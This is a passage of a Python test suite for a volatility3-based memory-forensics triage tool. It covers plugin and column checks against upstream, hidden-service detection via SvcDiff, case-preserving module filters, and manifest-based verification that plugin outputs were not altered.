        result = analysis.analyse(tmp_path)

        assert any("could not map its memory" in n.message for n in result.notices)

    def test_unreadable_json_is_recorded_not_raised(self, sample) -> None:
        (sample / "windows.pslist.PsList.json").write_text("{ not json")
        result = analysis.analyse(sample)

        assert "unreadable" in result.plugins_missing["windows.pslist.PsList"]


class TestAgainstInstalledVolatility:
    """Guards the extractor table against upstream renames.

    Mirrors what tests/test_triage.py does for the plugin list: a rename in
    volatility3 should fail a test here rather than produce an empty follow-up
    folder months later.
    """

    def test_every_extracted_plugin_still_exists(self, catalogue) -> None:
        missing = [e.plugin for e in analysis.EXTRACTORS if e.plugin not in catalogue]
        assert not missing, f"renamed or removed upstream: {missing}"

    def test_every_signal_source_still_exists(self, catalogue) -> None:
        missing = sorted(set(analysis.SIGNAL_SOURCE.values()) - set(catalogue))
        assert not missing, f"renamed or removed upstream: {missing}"

    def test_extracted_columns_match_the_plugins_treegrid(self, catalogue) -> None:
        """The column each extractor reads must be one the plugin emits.

        ModScan and SvcDiff subclass Modules and SvcScan and reuse the parent's
        grid, so the search walks the MRO rather than the class alone.
        """
        import inspect
        import re

        def columns_of(plugin_class) -> list[str]:
            for klass in plugin_class.__mro__:
                try:
                    source = inspect.getsource(klass)
                except (OSError, TypeError):
                    continue
                grid = re.search(r"TreeGrid\(\s*(?:columns\s*=\s*)?\[(.*?)\]\s*,",
                                 source, re.S)
                if grid:
                    return re.findall(r'\(\s*f?"([^"]+)"', grid.group(1))
            return []

        for extractor in analysis.EXTRACTORS:
            columns = columns_of(catalogue[extractor.plugin])
            assert columns, f"cannot find the TreeGrid for {extractor.plugin}"

            # The identity column may be either of the two the extractor knows.
            identity = [extractor.key] + ([extractor.alt_key]
                                          if extractor.alt_key else [])
            assert any(c in columns for c in identity), (
                f"{extractor.plugin} has none of {identity}; it now has {columns}"
            )
            for column in filter(None, [extractor.name, extractor.ppid]):
                assert column in columns, (
                    f"{extractor.plugin} no longer has a {column!r} column; "
                    f"it now has {columns}"
                )
            if extractor.offset_prefix:
                assert any(c.startswith(extractor.offset_prefix) for c in columns)


class TestFixtureIntegrity:
    def test_the_fixture_is_valid_json(self) -> None:
        for path in FIXTURE.glob("*.json"):
            json.loads(path.read_text())

    def test_the_fixture_carries_no_generated_output(self) -> None:
        """findings/ and followup/ are outputs; committing them would be circular."""
        assert not (FIXTURE / "findings").exists()
        assert not (FIXTURE / "followup").exists()


class TestSvcDiffSemantics:
    """SvcDiff yields `from_scan - from_list`, not a registry comparison.

    Upstream calls SvcScan.service_scan() and SvcList.service_list() and emits
    only the difference, so every row it produces is already the anomaly — and
    is by construction also a SvcScan row. An earlier version of this signal
    required "in SvcDiff and not in SvcScan", which could never be true.
    """

    def test_presence_alone_is_the_signal(self, analysed) -> None:
        (ghost,) = [s for s in analysed.services if s.key == "ghostsvc"]

        assert "svcdiff_hidden" in ghost.signals

    def test_it_fires_even_though_svcscan_also_saw_it(self, analysed) -> None:
        """The regression: requiring absence from SvcScan made this dead code."""
        (ghost,) = [s for s in analysed.services if s.key == "ghostsvc"]

        assert ghost.rows("windows.svcscan.SvcScan")
        assert ghost.rows("windows.malware.svcdiff.SvcDiff")
        assert "svcdiff_hidden" in ghost.signals

    def test_an_ordinary_service_does_not_fire(self, analysed) -> None:
        (dhcp,) = [s for s in analysed.services if s.key == "dhcp"]
        assert "svcdiff_hidden" not in dhcp.signals


class TestModuleFilterName:
    """--name is a case-sensitive substring test, so the key cannot be reused.

    Modules filters with `self.config["name"] not in BaseDllName`, inherited by
    ModScan. Passing the lowercased correlation key means a follow-up on
    Wdf01000.sys matches nothing and returns an empty folder with no error.
    """

    def test_the_correlation_key_stays_lowercase(self, analysed) -> None:
        (module,) = [m for m in analysed.modules if m.key == "wdf01000"]
        assert module.key == "wdf01000"

    def test_the_filter_name_preserves_case(self, analysed) -> None:
        (module,) = [m for m in analysed.modules if m.key == "wdf01000"]
        assert module.scope_values() == {"name": "Wdf01000"}

    def test_the_filter_name_would_match_the_basedllname(self, analysed) -> None:
        """Mirrors upstream's test exactly: `config["name"] not in BaseDllName`."""
        (module,) = [m for m in analysed.modules if m.key == "wdf01000"]
        name = module.scope_values()["name"]

        assert name in "Wdf01000.sys"
        assert module.key not in "Wdf01000.sys", "the key alone would not match"

    def test_a_basedllname_source_wins_over_a_driver_object_name(self) -> None:
        """DriverScan may name a module first; only Modules reports BaseDllName."""
        rows = {
            "windows.driverscan.DriverScan": [
                {"Driver Name": "\\Driver\\Wdf01000", "Name": "Wdf01000"}
            ],
            "windows.modules.Modules": [
                {"Name": "Wdf01000.sys", "Path": "\\SystemRoot\\x.sys"}
            ],
        }
        result = analysis.Analysis()
        analysis.build_entities(rows, result)
        (module,) = result.modules

        assert module.scope_values() == {"name": "Wdf01000"}

    def test_paths_and_extensions_are_stripped_case_intact(self) -> None:
        assert analysis.module_stem("\\Driver\\EvilRk") == "EvilRk"
        assert analysis.module_stem("NTOSKRNL.EXE") == "NTOSKRNL"
        assert analysis.module_stem(None) is None


class TestInputVerification:
    """The run manifest hashed every output so a consumer could check them."""

    def test_a_clean_folder_verifies(self, sample) -> None:
        check = analysis.verify_inputs(sample)

        assert check.ok
        assert len(check.verified) == 20
        assert not check.manifest_absent

    def test_a_modified_plugin_output_is_caught(self, sample) -> None:
        path = sample / "windows.pslist.PsList.json"
        rows = json.loads(path.read_text())
        rows[0]["ImageFileName"] = "innocent.exe"
        path.write_text(json.dumps(rows))

        check = analysis.verify_inputs(sample)

        assert not check.ok
        assert check.modified == ["windows.pslist.PsList.json"]

    def test_an_unattested_file_is_caught(self, sample) -> None:
        """A plugin re-run after the fact is not covered by the custody record."""
        (sample / "windows.netstat.NetStat.json").write_text("[]")

        check = analysis.verify_inputs(sample)

        assert not check.ok
        assert check.unattested == ["windows.netstat.NetStat.json"]

    def test_a_changed_log_does_not_invalidate_the_findings(self, sample) -> None:
        """Only the files analysis actually reads are checked."""
        (sample / "logs").mkdir(exist_ok=True)
        (sample / "logs" / "note.log").write_text("added later")

        assert analysis.verify_inputs(sample).ok

    def test_a_folder_without_a_manifest_is_reported_not_failed(self, sample) -> None:
        (sample / "run-manifest.json").unlink()
        check = analysis.verify_inputs(sample)

        assert check.manifest_absent
        assert check.as_dict()["manifest_present"] is False

    def test_a_manifest_with_no_digests_is_treated_as_absent(self, sample) -> None:
        (sample / "run-manifest.json").write_text('{"outputs": []}')
        assert analysis.verify_inputs(sample).manifest_absent
